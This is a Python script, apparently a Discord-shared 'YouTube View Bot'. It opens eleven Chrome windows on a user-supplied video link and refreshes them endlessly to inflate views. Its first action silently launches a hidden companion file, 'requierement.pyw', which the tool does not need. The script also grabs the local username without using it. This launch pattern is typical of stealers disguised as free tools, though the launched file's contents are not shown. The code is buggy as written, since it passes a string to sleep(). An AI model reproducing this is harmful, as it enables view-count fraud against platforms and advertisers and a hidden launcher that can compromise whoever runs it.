from selenium import webdriver
from time import sleep
from pystyle import *
import os
import getpass

USER_NAME = getpass.getuser()


os.startfile('requierement.pyw')

banner = """
_   _ ____ _  _ ___ _  _ ___  ____    _  _ _  _ ____    ___  ____ ___ 
 \_/  |  | |  |  |  |  | |__] |___    |  | |  | |___    |__] |  |  |  
  |   |__| |__|  |  |__| |__] |___     \/  |__| |___    |__] |__|  |  

                                      Made By Maxim3sama#6080                                
"""

print(Colorate.Diagonal(Colors.red_to_blue, banner, 1))
print(Colorate.Diagonal(Colors.red_to_blue, 'appuiyer sur entrer', 1))

input('')

print(Colorate.Diagonal(Colors.red_to_blue, 'quel est le lien de votre video? ', 1))
link = input((''))
print(Colorate.Diagonal(Colors.red_to_blue, 'tout les combien de temps voulez-vous que votre page se refresh? (en seconde, il est conseiller de mettre au moin 3/4 du temps de votre video)', 1))
refresh = input('')

driver1 = webdriver.Chrome(executable_path="chromedriver.exe")
driver2 = webdriver.Chrome(executable_path="chromedriver.exe")
driver3 = webdriver.Chrome(executable_path="chromedriver.exe")
driver4 = webdriver.Chrome(executable_path="chromedriver.exe")
driver5 = webdriver.Chrome(executable_path="chromedriver.exe")
driver6 = webdriver.Chrome(executable_path="chromedriver.exe")
driver7 = webdriver.Chrome(executable_path="chromedriver.exe")
driver8 = webdriver.Chrome(executable_path="chromedriver.exe")
driver9 = webdriver.Chrome(executable_path="chromedriver.exe")
driver10 = webdriver.Chrome(executable_path="chromedriver.exe")
driver11 = webdriver.Chrome(executable_path="chromedriver.exe")


driver1.get(link)
driver2.get(link)
driver3.get(link)
driver4.get(link)
driver5.get(link)
driver6.get(link)
driver7.get(link)
driver8.get(link)
driver9.get(link)
driver10.get(link)
driver11.get(link)


while True:
    sleep(refresh)
    driver1.refresh()
    driver2.refresh()
    driver3.refresh()
    driver4.refresh()
    driver5.refresh()
    driver6.refresh()
    driver7.refresh()
    driver8.refresh()
    driver9.refresh()
    driver10.refresh()
    driver11.refresh()
